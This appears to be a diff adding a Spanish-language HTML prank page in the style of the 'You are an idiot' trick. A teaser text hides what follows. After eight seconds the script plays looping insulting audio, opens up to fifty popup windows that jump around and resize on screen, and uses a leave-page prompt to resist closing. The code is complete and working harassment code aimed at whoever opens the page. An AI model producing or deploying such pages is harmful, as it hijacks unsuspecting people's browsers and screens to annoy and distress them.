@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>¡Espera un segundo...! 😈</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #000;
+      color: #0f0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      overflow: hidden;
+    }
+    h1 {
+      font-size: 100px;
+      color: #ff0000;
+      text-shadow: 0 0 30px #fff;
+      animation: blink 0.8s infinite alternate;
+    }
+    p {
+      font-size: 40px;
+      color: #ffff00;
+      text-align: center;
+      max-width: 90%;
+    }
+    @keyframes blink {
+      from { opacity: 0.6; }
+      to   { opacity: 1; }
+    }
+  </style>
+</head>
+<body>
+
+<h1>ESPERA...</h1>
+<p>Esto se pone interesante en unos segundos... 😏<br>(No cierres todavía, crack)</p>
+
+<audio id="idiotAudio" loop preload="auto">
+  <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
+  Tu navegador no soporta audio.
+</audio>
+
+<script>
+const audio = document.getElementById('idiotAudio');
+let windowsOpened = 0;
+const MAX_WINDOWS = 50;
+let chaosStarted = false;
+
+// Función para abrir ventana troll
+function openChaosWindow() {
+  if (windowsOpened >= MAX_WINDOWS || !chaosStarted) return;
+
+  const w = window.open('', '_blank', 'width=450,height=350,menubar=no,toolbar=no,location=no,status=no');
+  if (!w) return; // Bloqueado por popup blocker
+
+  windowsOpened++;
+
+  w.document.write(`
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>YOU ARE AN IDIOT!!!</title>
+      <style>
+        body { margin:0; background:#000 url('https://i.imgur.com/8zKxX.gif') repeat; color:#0f0; font-family:Arial; overflow:hidden; text-align:center; }
+        h1 { font-size:80px; margin-top:20vh; color:#ff0000; animation:blink 0.7s infinite; text-shadow:0 0 20px #fff; }
+        @keyframes blink { 50% { opacity:0.4; } }
+      </style>
+    </head>
+    <body>
+      <h1>YOU ARE AN<br>IDIOT!!!</h1>
+      <script>
+        function chaosMove() {
+          try {
+            let x = Math.random() * (screen.width - 450);
+            let y = Math.random() * (screen.height - 350);
+            window.moveTo(x, y);
+            window.resizeTo(450 + Math.random()*150, 350 + Math.random()*150);
+          } catch(e) {}
+        }
+        setInterval(chaosMove, 400);
+      <\/script>
+    </body>
+    </html>
+  `);
+  w.document.close();
+}
+
+// Iniciar caos "de la nada" después de 8 segundos
+setTimeout(() => {
+  chaosStarted = true;
+
+  // Intentar reproducir audio (puede requerir interacción previa)
+  audio.volume = 1.0;
+  audio.play().catch(() => {
+    // Si bloquea, intentamos forzar con un "truco" (a veces funciona si clic en página)
+    document.body.addEventListener('click', () => audio.play(), {once: true});
+  });
+
+  // Abrir las 50 ventanas con delays random para más sorpresa
+  for (let i = 0; i < MAX_WINDOWS; i++) {
+    setTimeout(() => {
+      openChaosWindow();
+    }, 1000 + i * 300 + Math.random() * 800); // Empieza después de 1s, y espaciadas
+  }
+
+  // Cambiar página principal a mensaje troll
+  document.body.innerHTML = `
+    <h1 style="font-size:140px; color:#00ff00;">¡IDIOT MODE ACTIVADO! 😂</h1>
+    <p style="font-size:60px; color:white;">50 ventanas gritándote que eres un IDIOTA... ¡Sorpresa, amigo! 😈<br>Con cariño desde Barranquilla</p>
+  `;
+
+}, 8000); // 8 segundos de "calma" antes del caos
+
+// Intento de prevenir cierre fácil (troll)
+window.onbeforeunload = function() {
+  if (chaosStarted) {
+    return "¡No cierres, IDIOTA! ¡Aún hay más!";
+  }
+};
+
+</script>
+
+</body>
+</html>
